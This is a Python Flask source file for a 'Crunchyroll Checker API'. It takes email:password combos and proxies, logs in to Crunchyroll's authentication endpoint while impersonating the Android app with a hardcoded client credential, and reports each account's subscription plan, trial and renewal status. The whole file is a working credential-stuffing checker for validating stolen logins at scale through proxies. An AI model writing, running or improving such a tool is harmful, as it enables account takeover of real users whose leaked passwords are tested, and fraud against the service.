from flask import Flask, request, jsonify
import requests
from urllib.parse import quote

app = Flask(__name__)

# ----------------------------
# Utility: Proxy Formatter
# ----------------------------
def format_proxy(proxy):
    if not proxy:
        return None
    if "@" in proxy:
        if not proxy.startswith("http"):
            proxy = "http://" + proxy
        return {"http": proxy, "https": proxy}
    parts = proxy.split(":")
    if len(parts) == 4:
        ip, port, user, pwd = parts
        pstr = f"http://{user}:{pwd}@{ip}:{port}"
        return {"http": pstr, "https": pstr}
    elif len(parts) == 2:
        ip, port = parts
        pstr = f"http://{ip}:{port}"
        return {"http": pstr, "https": pstr}
    return None

# ----------------------------
# Utility: Curl-like Request
# ----------------------------
def curl_request(url, headers=None, data=None, proxy=None):
    proxies = format_proxy(proxy) if proxy else None
    try:
        if data:
            res = requests.post(url, headers=headers, data=data, proxies=proxies, timeout=25)
        else:
            res = requests.get(url, headers=headers, proxies=proxies, timeout=25)
        return res.text, None, res.status_code
    except Exception as e:
        return None, str(e), None

# ----------------------------
# / route
# ----------------------------
@app.route("/")
def home():
    return jsonify({
        "message": "Crunchyroll Checker API",
        "usage": "/?route=check&email=email:pass&proxy=proxy&raw=1"
    })

# ----------------------------
# /check endpoint
# ----------------------------
@app.route("/check")
def check():
    combo = request.args.get("email", "").strip()
    proxy = request.args.get("proxy", "").strip()
    raw = "raw" in request.args

    if not combo or ":" not in combo:
        return jsonify({"error": "Use ?route=check&email=email:pass&proxy=proxy"}), 400

    email, password = combo.split(":", 1)
    if not email or not password:
        return jsonify({"error": "Missing email or password"}), 400

    # --- Step 1: Get Access Token ---
    url = "https://beta-api.crunchyroll.com/auth/v1/token"
    headers = {
        "User-Agent": "Crunchyroll/3.78.3 Android/9 okhttp/4.12.0",
        "Authorization": "Basic bWZsbzhqeHF1cTFxeWJwdmY3cXA6VEFlTU9SRDBGRFhpdGMtd0l6TVVfWmJORVRRT2pXWXg=",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    data = {
        "username": email,
        "password": password,
        "grant_type": "password",
        "scope": "offline_access",
        "device_id": "14427c33-1893-4bc5-aaf3-dea072be2831",
        "device_type": "Chrome on Android"
    }

    res_text, err, status = curl_request(url, headers, data, proxy)
    if err:
        return jsonify({"error": f"Curl Error: {err}"})

    json_res = None
    try:
        json_res = requests.utils.json.loads(res_text)
    except Exception:
        json_res = None

    if raw:
        return res_text, 200, {"Content-Type": "application/json"}

    if not json_res or "error" in json_res:
        return jsonify({
            "account": f"{email}:{password}",
            "status": "Invalid Credentials",
            "raw": json_res or res_text
        })

    token = json_res.get("access_token")
    if not token:
        return jsonify({
            "account": f"{email}:{password}",
            "status": "No token received",
            "raw": json_res
        })

    # --- Step 2: Fetch Account Info ---
    me_url = "https://www.crunchyroll.com/accounts/v1/me"
    me_headers = {
        "User-Agent": "Mozilla/5.0",
        "Authorization": f"Bearer {token}"
    }
    me_res, me_err, me_status = curl_request(me_url, me_headers, proxy=proxy)
    me_json = None
    try:
        me_json = requests.utils.json.loads(me_res)
    except Exception:
        me_json = {}

    account_id = me_json.get("account_id", "")

    # --- Step 3: Subscriptions ---
    subs_url = f"https://www.crunchyroll.com/subs/v4/accounts/{account_id}/subscriptions"
    subs_headers = {
        "User-Agent": "Mozilla/5.0",
        "Authorization": f"Bearer {token}",
        "Accept": "application/json"
    }
    subs_res, subs_err, subs_status = curl_request(subs_url, subs_headers, proxy=proxy)
    subs_json = None
    try:
        subs_json = requests.utils.json.loads(subs_res)
    except Exception:
        subs_json = {}

    if raw:
        return subs_res, 200, {"Content-Type": "application/json"}

    # --- Final Response ---
    subscription = (subs_json.get("subscriptions") or [{}])[0]
    plan_text = subscription.get("plan", {}).get("tier", {}).get("text", "Free")
    status_text = subscription.get("status", "Unknown")
    trial = subscription.get("activeFreeTrial", False)
    renewal = subscription.get("nextRenewalDate", "N/A")

    return jsonify({
        "account": f"{email}:{password}",
        "status": status_text,
        "plan": plan_text,
        "trial": trial,
        "renewal": renewal,
        "raw": {
            "login": json_res,
            "me": me_json,
            "subs": subs_json
        }
    })

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8000, debug=True)
